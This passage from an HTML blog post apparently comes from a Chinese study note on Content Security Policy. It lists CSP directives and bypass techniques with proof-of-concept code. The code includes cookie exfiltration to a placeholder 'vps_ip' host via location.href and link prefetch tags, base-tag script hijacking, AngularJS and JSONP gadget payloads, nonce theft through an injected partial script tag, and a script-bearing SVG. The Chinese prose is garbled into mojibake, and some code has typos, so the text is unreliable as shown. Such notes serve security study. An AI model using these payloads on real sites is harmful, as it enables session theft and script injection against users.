<li>script-src: å®šä¹‰äº†é¡µé¢ä¸­Javascriptçš„æœ‰æ•ˆæ¥æº</li>
<li>style-srcï¼šå®šä¹‰äº†é¡µé¢ä¸­CSSæ ·å¼çš„æœ‰æ•ˆæ¥æº</li>
<li>img-src: å®šä¹‰äº†é¡µé¢ä¸­å›¾ç‰‡å’Œå›¾æ ‡çš„æœ‰æ•ˆæ¥æº</li>
<li>font-src: å®šä¹‰äº†å­—ä½“åŠ è½½çš„æœ‰æ•ˆæ¥æº</li>
<li>media-src: ç”¨äºé™åˆ¶å…è®¸ä¼ è¾“è§†é¢‘å’ŒéŸ³é¢‘çš„æ¥æºã€‚</li>
<li>object-src: å¯å¯¹ Flash å’Œå…¶ä»–æ’ä»¶è¿›è¡Œæ§åˆ¶ã€‚</li>
<li>plugin-types: ç”¨äºé™åˆ¶é¡µé¢å¯ä»¥è°ƒç”¨çš„æ’ä»¶ç§ç±»ã€‚</li>
<li>child-src: å®šä¹‰äº†web workersä»¥åŠåµŒå¥—çš„æµè§ˆä¸Šä¸‹æ–‡ï¼ˆå¦‚<code>&lt;frame&gt;å’Œ&lt;iframe&gt;</code>ï¼‰çš„æº</li>
<li>content-src: å®šä¹‰äº†è¯·æ±‚ã€XMLHttpRequestã€WebSocket å’Œ EventSource çš„è¿æ¥æ¥æº</li>
<li>â–² default-src: è‡ªå®šä¹‰é»˜è®¤å½¢å¼<ul>
<li>å¦‚æœåŒæ—¶è®¾ç½®æŸä¸ªå•é¡¹é™åˆ¶ï¼ˆæ¯”å¦‚font-srcï¼‰å’Œdefault-srcï¼Œå‰è€…ä¼šè¦†ç›–åè€…ï¼Œå³å­—ä½“æ–‡ä»¶ä¼šé‡‡ç”¨font-srcçš„å€¼ï¼Œå…¶ä»–èµ„æºä¾ç„¶é‡‡ç”¨default-srcçš„å€¼</li>
</ul>
</li>
</ul>
<h5 id="å…³é”®å­—"><a href="#å…³é”®å­—" class="headerlink" title="å…³é”®å­—"></a>å…³é”®å­—</h5><ul>
<li>â€˜noneâ€™ -&gt; img-src â€˜noneâ€™<ul>
<li>ä¸å…è®¸ä»»ä½•å†…å®¹</li>
</ul>
</li>
<li>â€˜selfâ€™ -&gt; img-src â€˜selfâ€™<ul>
<li>ä»£è¡¨å’Œæ–‡æ¡£åŒæºï¼ŒåŒ…æ‹¬ç›¸åŒçš„URLåè®®å’Œç«¯å£å·ã€‚ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„ã€‚</li>
</ul>
</li>
<li>â€˜unsafe-inlineâ€™ -&gt; script-src â€˜unsafe-inlineâ€™<ul>
<li>å…è®¸åŠ è½½inlineèµ„æºï¼ˆä¾‹å¦‚å¸¸è§çš„styleå±æ€§ï¼Œonclickï¼Œinline jså’Œinline cssç­‰ç­‰ï¼‰</li>
</ul>
</li>
<li>â€˜unsafe-evalâ€™ -&gt; script-src â€˜unsafe-evalâ€™<ul>
<li>å…è®¸åŠ è½½åŠ¨æ€jsä»£ç ï¼Œä¾‹å¦‚eval()</li>
</ul>
</li>
<li>data: -&gt; img-src data:<ul>
<li>å…è®¸æ¥è‡ªç›¸åŒæ¥æºçš„å†…å®¹ï¼ˆç›¸åŒçš„åè®®ã€åŸŸåå’Œç«¯å£ï¼‰</li>
</ul>
</li>
<li>æ³¨è§£<ul>
<li>å¦‚æœä¸ç‰¹åˆ«æŒ‡å®š<code>&#39;unsafe-inline&#39;</code>æ—¶ï¼Œé¡µé¢ä¸Šæ‰€æœ‰inlineæ ·å¼å’Œè„šæœ¬éƒ½ä¸ä¼šæ‰§è¡Œ</li>
<li>ä¸ç‰¹åˆ«æŒ‡å®š<code>&#39;unsafe-eval&#39;</code>ï¼Œé¡µé¢ä¸Šä¸å…è®¸ä½¿ç”¨new Functionï¼ŒsetTimeoutï¼Œevalç­‰æ–¹å¼æ‰§è¡ŒåŠ¨æ€ä»£ç </li>
</ul>
</li>
</ul>
<h5 id="æ”¶é›†ä¸åŒ¹é…è§„åˆ™çš„æ—¥å¿—"><a href="#æ”¶é›†ä¸åŒ¹é…è§„åˆ™çš„æ—¥å¿—" class="headerlink" title="æ”¶é›†ä¸åŒ¹é…è§„åˆ™çš„æ—¥å¿—"></a>æ”¶é›†ä¸åŒ¹é…è§„åˆ™çš„æ—¥å¿—</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//å‘ç”Ÿçš„CSPå¤´</span><br><span class="line">Content-Security-Policy-Report-Only: script-src &apos;self&apos;; report-uri http://test/</span><br><span class="line"></span><br><span class="line">//è¿™æ ·ï¼Œå¦‚æœé¡µé¢ä¸Šæœ‰inline JSï¼Œä¾ç„¶ä¼šæ‰§è¡Œï¼Œåªæ˜¯æµè§ˆå™¨ä¼šå‘æŒ‡å®šåœ°å€å‘é€ä¸€ä¸ªPOSTè¯·æ±‚ï¼ŒåŒ…å«è¿™æ ·çš„ä¿¡æ¯</span><br><span class="line">&#123;&quot;csp-report&quot;:&#123;&quot;document-uri&quot;:&quot;http://test/test.php&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;violated-directive&quot;:&quot;script-src &apos;self&apos;&quot;,&quot;original-policy&quot;:&quot;script-src &apos;self&apos;; report-uri http://test/&quot;,&quot;blocked-uri&quot;:&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP" target="_blank" rel="noopener">å†…å®¹å®‰å…¨ç­–ç•¥ (CSP)</a></li>
</ul>
<h2 id="å†…å®¹å®‰å…¨ç­–ç•¥çš„ç»•è¿‡"><a href="#å†…å®¹å®‰å…¨ç­–ç•¥çš„ç»•è¿‡" class="headerlink" title="å†…å®¹å®‰å…¨ç­–ç•¥çš„ç»•è¿‡"></a>å†…å®¹å®‰å…¨ç­–ç•¥çš„ç»•è¿‡</h2><ul>
<li>location.href</li>
<li>linkæ ‡ç­¾å¯¼è‡´çš„ç»•è¿‡</li>
<li>ä½¿ç”¨iframeç»•è¿‡</li>
<li>ç”¨CDNç»•è¿‡</li>
<li>ç«™ç‚¹å¯æ§é™æ€èµ„æºç»•è¿‡</li>
<li>ç«™ç‚¹å¯æ§JSONPç»•è¿‡</li>
<li>Base-uriç»•è¿‡</li>
<li>ä¸å®Œæ•´scriptç»•è¿‡nonce</li>
<li>object-srcç»•è¿‡ï¼ˆPDFXSSï¼‰ -&gt; æš‚æ— å­¦</li>
<li>SVGç»•è¿‡</li>
<li>ä¸å®Œæ•´çš„èµ„æºæ ‡ç­¾è·å–èµ„æº</li>
<li>CSSé€‰æ‹©å™¨è·å–å†…å®¹  -&gt;  æš‚æ— å­¦</li>
<li>CRLFç»•è¿‡</li>
</ul>
<h3 id="0X00-location-href"><a href="#0X00-location-href" class="headerlink" title="0X00 location.href"></a>0X00 location.href</h3><ul>
<li>CSPä¸å½±å“location.hrefè·³è½¬</li>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>å¯ä»¥æ‰§è¡Œä»»æ„JSè„šæœ¬ï¼Œä½†æ˜¯ç”±äºå—åˆ°CSPå½±å“æ— æ³•å¤–å¸¦æ•°æ®</li>
</ul>
</li>
<li>å°†cookieæ‰“åˆ°ä¸ªäººvpsä¸Š<ul>
<li><code>location.href = &quot;vps_ip:xxxx?+document.cookie</code></li>
</ul>
</li>
</ul>
<h3 id="0X01-linkæ ‡ç­¾å¯¼è‡´çš„ç»•è¿‡"><a href="#0X01-linkæ ‡ç­¾å¯¼è‡´çš„ç»•è¿‡" class="headerlink" title="0X01 linkæ ‡ç­¾å¯¼è‡´çš„ç»•è¿‡"></a>0X01 linkæ ‡ç­¾å¯¼è‡´çš„ç»•è¿‡</h3><ul>
<li>â–² æ–¹æ³•è¾ƒè€ï¼Œä¸ä¸€å®šèƒ½æˆåŠŸå®ç°ï¼Œç°åœ¨å¤§éƒ¨åˆ†æµè§ˆå™¨çš„CSPå¼€å§‹çº¦æŸè¿™ä¸ªæ ‡ç­¾</li>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>å¯ä»¥æ‰§è¡Œä»»æ„JSè„šæœ¬ï¼Œä½†æ˜¯ç”±äºå—åˆ°CSPå½±å“æ— æ³•å¤–å¸¦æ•°æ®</li>
</ul>
</li>
<li>åˆ©ç”¨æ ‡ç­¾å°†æ•°æ®å¤–å¸¦</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----SCPçš„é™åˆ¶</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-scr &apos;self&apos;&quot;&gt;</span><br><span class="line"></span><br><span class="line">----å†™æ­»çš„å¤–å¸¦linkæ ‡ç­¾</span><br><span class="line">&lt;!-- firefox --&gt;</span><br><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//$&#123;cookie&#125;.vps_ip&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- chrome --&gt;</span><br><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;//vps_ip?$&#123;cookie&#125;&#125;&quot;&gt;</span><br><span class="line"></span><br><span class="line">----ä¸å†™æ­»çš„å¤–å¸¦linkæ ‡ç­¾</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var link = document.createElement(&quot;link&quot;);</span><br><span class="line">link.setAttribute(&quot;rel&quot;,&quot;prefetch&quot;);</span><br><span class="line">link.setAttribute(&quot;href&quot;,&quot;//vps_ip?&quot;+document.cookie);</span><br><span class="line">documnet.head.appendChild(link);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0X02-ä½¿ç”¨iframeç»•è¿‡"><a href="#0X02-ä½¿ç”¨iframeç»•è¿‡" class="headerlink" title="0X02 ä½¿ç”¨iframeç»•è¿‡"></a>0X02 ä½¿ç”¨iframeç»•è¿‡</h3><ul>
<li>èƒŒæ™¯ï¼šå½“ä¸€ä¸ªåŒæºç«™ç‚¹ï¼ŒåŒæ—¶å­˜åœ¨ä¸¤ä¸ªé¡µé¢ï¼Œå…¶ä¸­ä¸€ä¸ªæœ‰CSPä¿æŠ¤çš„Aé¡µé¢ï¼Œå¦ä¸€ä¸ªæ²¡æœ‰CSPä¿æŠ¤Bé¡µé¢ï¼Œé‚£ä¹ˆå¦‚æœBé¡µé¢å­˜åœ¨XSSæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨Bé¡µé¢æ–°å»ºiframeç”¨javascriptç›´æ¥æ“ä½œAé¡µé¢çš„domï¼Œå¯ä»¥è¯´Aé¡µé¢çš„CSPé˜²æŠ¤å®Œå…¨å¤±æ•ˆ</li>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>ä¸€ä¸ªåŒæºç«™ç‚¹å†…å­˜åœ¨ä¸¤ä¸ªé¡µé¢ï¼Œä¸€ä¸ªé¡µé¢å­˜åœ¨CSPä¿æŠ¤ï¼Œå¦ä¸€ä¸ªé¡µé¢æ²¡æœ‰CSPä¿æŠ¤ä¸”å­˜åœ¨XSSæ¼æ´ï¼ˆå­˜åœ¨XSSæ¼æ´åŸå› æ˜¯éœ€è¦æ‰§è¡ŒJSä»£ç ï¼‰</li>
<li>æˆ‘ä»¬éœ€è¦çš„æ•°æ®åœ¨å­˜åœ¨CSPä¿æŠ¤çš„é¡µé¢</li>
</ul>
</li>
<li>æµ‹è¯•ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php  -&gt; Aé¡µé¢</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos; script-src &apos;self&apos;&quot;&gt;</span><br><span class="line">&lt;h1 id=&quot;flag&quot;&gt;flag&#123;this_is_flag&#125;&lt;/h1&gt;</span><br><span class="line">---test1.www.xyz/3.php  -&gt; Bé¡µé¢</span><br><span class="line">//æ¨¡æ‹ŸXSS</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var iframe = document.createElement(&apos;iframe&apos;);</span><br><span class="line">    iframe.src = &quot;1.php&quot;;</span><br><span class="line">    document.body.appenChild(iframe);</span><br><span class="line">    setTimeout(()=&gt;alert(iframe.contentView.document.getElementById(&apos;flag&apos;).innertHTML),1000)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/scp/iframe-alert.png" alt="iframe-alert"></p>
<h3 id="OXO3-ç”¨CDNæ¥ç»•è¿‡"><a href="#OXO3-ç”¨CDNæ¥ç»•è¿‡" class="headerlink" title="OXO3 ç”¨CDNæ¥ç»•è¿‡"></a>OXO3 ç”¨CDNæ¥ç»•è¿‡</h3><ul>
<li>èƒŒæ™¯<ul>
<li>å‰ç«¯ä¼šç”¨åˆ°è®¸å¤šçš„å‰ç«¯æ¡†æ¶å’Œåº“ï¼Œå¼•ç”¨åˆ°å…¶ä»–CDNä¸Šçš„JSæ¡†æ¶</li>
<li>CDNä¸Šå¦‚æœå­˜åœ¨ä¸€äº›ä½ç‰ˆæœ¬çš„æ¡†æ¶ï¼Œå°±å¯èƒ½å­˜åœ¨ç»•è¿‡CSPçš„é£é™©</li>
</ul>
</li>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>CDNæœåŠ¡å•†å­˜åœ¨æŸäº›ä½ç‰ˆæœ¬çš„jsåº“</li>
<li>CDNæœåŠ¡å•†åœ¨CSPç™½åå•ä¸­</li>
<li>è°ƒç”¨CDNæœåŠ¡å•†çš„jsåº“</li>
</ul>
</li>
<li>å¼•ç”¨orangeå¸ˆå‚…é‡‡ç”¨äº†ä½ç‰ˆæœ¬çš„angular jsæ¨¡æ¿æ³¨å…¥æ¥ç»•è¿‡CSP</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- foo=&quot;--&gt;</span><br><span class="line">&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;div ng-app&gt;</span><br><span class="line">    &#123;&#123;constructor.constructor(&apos;alert(document.cookie)&apos;)()&#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">//sssss&quot; --&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>å¦‚æœç”¨äº†Jquery-mobileåº“ï¼Œä¸”CSPä¸­åŒ…å«<code>&quot;script-src &#39;unsafe-eval&#39;&quot;æˆ–è€…&quot;script-src &#39;strict-dynamic&#39;&quot;</code>ï¼Œå¯ä»¥ç”¨æ­¤exp</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div data-role=popup id=&apos;&lt;script&gt;alert(1)&lt;/script&gt;&apos;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76" target="_blank" rel="noopener">ä½ç‰ˆæœ¬angular jsçš„CDNæœåŠ¡å•†åˆ—è¡¨</a></li>
<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">åº“å¯ä»¥ç»•è¿‡CSPï¼ˆæ¥è‡ªblackhat2017ï¼‰</a></li>
</ul>
<h3 id="0X04-ç«™ç‚¹å¯æ§é™æ€èµ„æºç»•è¿‡"><a href="#0X04-ç«™ç‚¹å¯æ§é™æ€èµ„æºç»•è¿‡" class="headerlink" title="0X04 ç«™ç‚¹å¯æ§é™æ€èµ„æºç»•è¿‡"></a>0X04 ç«™ç‚¹å¯æ§é™æ€èµ„æºç»•è¿‡</h3><ul>
<li>â–² æ„Ÿè§‰è·ŸCDNæ¥ç»•è¿‡çš„æ–¹å¼æœ‰ç‚¹åƒï¼Œéƒ½æ˜¯è°ƒç”¨å¤–éƒ¨çš„åº“æˆ–è€…åŒ…ï¼Œç„¶åå¯ä»¥å¼•ç”¨</li>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>ç«™ç‚¹å­˜åœ¨å¯æ§é™æ€èµ„æº</li>
<li>ç«™ç‚¹åœ¨CSPç™½åå•ä¸­</li>
</ul>
</li>
<li>ä¾‹å­<ul>
<li>å¦‚æœå‰ç«¯çš„CSPä¸­ä½¿ç”¨åˆ°äº†<a href="http://www.google-analytics.com" target="_blank" rel="noopener">www.google-analytics.com</a></li>
<li>è€Œ<a href="http://www.google.analytics.comä¸­æä¾›äº†è‡ªå®šä¹‰javascriptçš„åŠŸèƒ½ï¼ˆgoogleä¼šå°è£…è‡ªå®šä¹‰çš„jsï¼Œæ‰€ä»¥è¿˜éœ€è¦unsafe-evalï¼‰ï¼Œäºæ˜¯å¯ä»¥ç»•è¿‡CSP" target="_blank" rel="noopener">www.google.analytics.comä¸­æä¾›äº†è‡ªå®šä¹‰javascriptçš„åŠŸèƒ½ï¼ˆgoogleä¼šå°è£…è‡ªå®šä¹‰çš„jsï¼Œæ‰€ä»¥è¿˜éœ€è¦unsafe-evalï¼‰ï¼Œäºæ˜¯å¯ä»¥ç»•è¿‡CSP</a></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//è®¿é—®www.google.analytics.comè‡ªå®šä¹‰jsçš„åŠŸèƒ½ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªid</span><br><span class="line">function test()&#123;</span><br><span class="line">    return alert(&quot;here&quot;)</span><br><span class="line">&#125;</span><br><span class="line">----test1.www.xyz/1.phpï¼ˆå°†è·å¾—çš„idå¡«å…¥ä¸‹é¢çš„é“¾æ¥ä¸­çš„idå³å¯ï¼‰</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;unsafe-eval&apos; https://www.google-analytics.com&quot;&gt;</span><br><span class="line">&lt;script src=&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>åŒç†ï¼Œè‹¥å…¶ä»–ç«™ç‚¹ä¸‹æä¾›äº†å¯æ§é™æ€èµ„æºçš„åŠŸèƒ½ï¼Œä¸”CSPä¸­å…è®¸äº†æ­¤ç«™ç‚¹</li>
<li>â–² 2020.06.05 <a href="http://www.google.analytics.comæš‚æ— æ³•è¿›è¡Œè®¿é—®" target="_blank" rel="noopener">www.google.analytics.comæš‚æ— æ³•è¿›è¡Œè®¿é—®</a></li>
</ul>
<h3 id="0X05-ç«™ç‚¹å¯æ§JSONPç»•è¿‡"><a href="#0X05-ç«™ç‚¹å¯æ§JSONPç»•è¿‡" class="headerlink" title="0X05 ç«™ç‚¹å¯æ§JSONPç»•è¿‡"></a>0X05 ç«™ç‚¹å¯æ§JSONPç»•è¿‡</h3><ul>
<li>å‰æï¼šå¤§éƒ¨åˆ†ç«™ç‚¹çš„jsonpæ˜¯å®Œå…¨å¯æ§çš„ï¼Œåªä¸è¿‡æœ‰äº›ç«™ç‚¹ä¼šè®©jsonpä¸è¿”å›htmlç±»å‹é˜²æ­¢ç›´æ¥çš„åå°„å‹XSSï¼Œä½†æ˜¯å¦‚æœå°†urlæ’å…¥åˆ°scriptæ ‡ç­¾ä¸­ï¼Œé™¤éè®¾ç½®x-content-type-optionså¤´ï¼Œå¦è€…å°½ç®¡è¿”å›ç±»å‹ä¸ä¸€è‡´ï¼Œæµè§ˆå™¨ä¾æ—§ä¼šå½“æˆjsè¿›è¡Œè§£æ</li>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>ç«™ç‚¹å­˜åœ¨å¯æ§Jsonp</li>
<li>ç«™ç‚¹åœ¨CSPç™½åå•ä¸­</li>
</ul>
</li>
<li>ä¾‹å­ï¼šGoogleç«™ç‚¹å­˜åœ¨äº†ç”¨æˆ·å¯æ§jsonp</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;;script-src https://www.google.com&quot;&gt;</span><br><span class="line">&lt;script src=&quot;https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>â–² é…åˆæ³¨é‡Šï¼Œå¯ä»¥æ‰§è¡Œä»»æ„js</li>
<li><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">ä¸€äº›å­˜åœ¨ç”¨æˆ·å¯æ§èµ„æºæˆ–è€…jsonpæ¯”è¾ƒå¸¸ç”¨ç«™ç‚¹çš„githubé¡¹ç›®</a></li>
</ul>
<h3 id="0X06-Base-uriç»•è¿‡"><a href="#0X06-Base-uriç»•è¿‡" class="headerlink" title="0X06 Base-uriç»•è¿‡"></a>0X06 Base-uriç»•è¿‡</h3><blockquote>
<p>   æ— ç»å¯¹è·¯å¾„çš„ä¸å®Œæ•´èµ„æº</p>
</blockquote>
<ul>
<li>å½“æœåŠ¡å™¨CSPçš„script-srcé‡‡ç”¨äº†nonceæ—¶ï¼Œå¦‚æœåªè®¾ç½®äº†default-srcæ²¡æœ‰é¢å¤–è®¾ç½®base-uriï¼Œå°±å¯ä»¥ä½¿ç”¨<code>&lt;base&gt;</code>æ ‡ç­¾ä½¿å½“å‰é¡µé¢ä¸Šä¸‹æ–‡ä¸ºè‡ªå·±çš„vpsï¼Œå¦‚æœé¡µé¢ä¸­çš„åˆæ³•scriptæ ‡ç­¾é‡‡ç”¨äº†ç›¸å¯¹è·¯å¾„ï¼Œé‚£ä¹ˆæœ€ç»ˆåŠ è½½çš„jså°±æ˜¯é’ˆå¯¹baseæ ‡ç­¾ä¸­æŒ‡å®šurlçš„ç›¸å¯¹è·¯å¾„</li>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>CSPä¸­çš„script-srcåªä½¿ç”¨nonce</li>
<li>æ²¡æœ‰é¢å¤–è®¾ç½®base-uri</li>
<li>é¡µé¢å¼•ç”¨å­˜åœ¨ç›¸å¯¹è·¯å¾„çš„<code>&lt;script&gt;</code>æ ‡ç­¾</li>
</ul>
</li>
<li>æµ‹è¯•ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;nonce-test&apos;&quot;&gt;</span><br><span class="line">&lt;base href=&quot;//vps_ip/&quot;&gt;</span><br><span class="line">&lt;script nonce=&apos;test&apos; src=&quot;2.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0X07-ä¸å®Œæ•´çš„scriptæ ‡ç­¾ç»•è¿‡nonce"><a href="#0X07-ä¸å®Œæ•´çš„scriptæ ‡ç­¾ç»•è¿‡nonce" class="headerlink" title="0X07 ä¸å®Œæ•´çš„scriptæ ‡ç­¾ç»•è¿‡nonce"></a>0X07 ä¸å®Œæ•´çš„scriptæ ‡ç­¾ç»•è¿‡nonce</h3><ul>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>å¯æ§ç‚¹åœ¨åˆæ³•scriptæ ‡ç­¾ä¸Šæ–¹,ä¸”å…¶ä¸­æ²¡æœ‰å…¶ä»–æ ‡ç­¾</li>
<li>XSSé¡µé¢çš„CSPçš„script-srcåªé‡‡ç”¨äº†nonceæ–¹å¼</li>
</ul>
</li>
<li>æµ‹è¯•ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;?php header(&quot;X-XSS-Protection:0&quot;);?&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;;script-src &apos;nonce-xxxx&apos;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&apos;xss&apos;];?&gt;</span><br><span class="line">&lt;script nonce=&apos;xxxx&apos;&gt;</span><br><span class="line">    //do some thing</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>è¾“å…¥<code>http://test1.www.xyz/1.php?xss=&lt;script src=data:text/plain,alert(1)</code>ï¼Œå³é€ æˆxss</li>
<li>è§£é‡Šï¼šè¿™æ˜¯å› ä¸ºå½“æµè§ˆå™¨ç¢°åˆ°ä¸€ä¸ªå·¦å°–æ‹¬å·æ—¶ï¼Œä¼šå˜æˆæ ‡ç­¾å¼€å§‹çŠ¶æ€ï¼Œç„¶åä¼šä¸€ç›´æŒç»­åˆ°ç¢°åˆ°å³å°–æ‹¬å·ä¸ºæ­¢ï¼Œåœ¨å…¶ä¸­çš„æ•°æ®éƒ½ä¼šè¢«å½“æˆæ ‡ç­¾åæˆ–è€…å±æ€§ï¼Œæ‰€ä»¥ç¬¬äº”è¡Œçš„<code>&lt;script</code>ä¼šå˜æˆä¸€ä¸ªå±æ€§ï¼Œå€¼ä¸ºç©ºï¼Œä¹‹åçš„nonce=â€™xxxxxâ€™ä¼šè¢«å½“æˆæˆ‘ä»¬è¾“å…¥çš„scriptçš„æ ‡ç­¾çš„ä¸€ä¸ªå±æ€§ï¼Œç›¸å½“äºæˆ‘ä»¬ç›—å–äº†åˆæ³•çš„scriptæ ‡ç­¾ä¸­çš„nonceï¼Œäºæ˜¯æˆåŠŸç»•è¿‡äº†scripr-src</li>
</ul>
<p><img src="/images/sop_cors_csp/scp/nonce-example.png" alt="nonce-example"></p>
<ul>
<li>â–² 2020.06.05 æœ¬å®éªŒåœ¨Firefoxä¸Šå®éªŒæˆåŠŸï¼Œåœ¨Chromeä¸Šä¸æˆåŠŸ<ul>
<li>å³ä½¿æ„é€ ç‰¹æ®Šçš„url<code>http://test1.www.xyz/1.php?xss=123&lt;script src=&quot;data:text/plain,alert(1)&quot; a=123 a=</code>ï¼Œä¹Ÿæ— æ³•æˆåŠŸï¼Œè¿˜æ˜¯ä¼šå—åˆ°CSPå½±å“</li>
<li>ç‰¹æ®Šçš„urlè§£æï¼šå…ˆæ–°å»ºä¸€ä¸ªaå±æ€§ï¼Œç„¶åå†æ–°å»ºç¬¬äºŒä¸ªaå±æ€§ï¼Œè¿™æ ·æˆ‘ä»¬å°±å°†ç¬¬äºŒä¸ª<code>&lt;script</code>èµ‹ç»™äº†ç¬¬äºŒä¸ªaå±æ€§ï¼Œæµè§ˆå™¨åœ¨è§£æçš„æ—¶å€™ç›´æ¥å¿½ç•¥äº†ç¬¬äºŒä¸ªå±æ€§åŠå…¶åé¢çš„å€¼ï¼Œè¿™æ ·Payloadå°±èƒ½æˆåŠŸåœ¨chromeæµè§ˆå™¨ä¸Šæ‰§è¡Œ</li>
<li>æ ‡ç­¾çš„ä¸€ä¸ªæŠ€å·§ï¼šå½“ä¸€ä¸ªæ ‡ç­¾å­˜åœ¨ä¸¤ä¸ªåŒåå±æ€§æ—¶ï¼Œç¬¬äºŒä¸ªå±æ€§çš„å±æ€§ååŠå…¶å±æ€§å€¼éƒ½ä¼šè¢«æµè§ˆå™¨å¿½ç•¥</li>
</ul>
</li>
</ul>
<p><img src="/images/sop_cors_csp/scp/nonce-chrome-error.png" alt="nonce-chrome-error"></p>
<h3 id="0X08-SVGç»•è¿‡"><a href="#0X08-SVGç»•è¿‡" class="headerlink" title="0X08 SVGç»•è¿‡"></a>0X08 SVGç»•è¿‡</h3><ul>
<li>SVGä½œä¸ºä¸€ä¸ªçŸ¢é‡å›¾ï¼Œä½†æ˜¯å´èƒ½å¤Ÿæ‰§è¡Œjavascriptè„šæœ¬ï¼Œå¦‚æœé¡µé¢ä¸­å­˜åœ¨ä¸Šä¼ åŠŸèƒ½ï¼Œå¹¶ä¸”æ²¡æœ‰è¿‡æ»¤svgï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„svgå›¾åƒæ¥xss</li>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>å¯ä»¥ä¸Šä¼ svgå›¾ç‰‡</li>
</ul>
</li>
<li>1.svg</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line">&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt;  &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot;</span><br><span class="line">    href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span 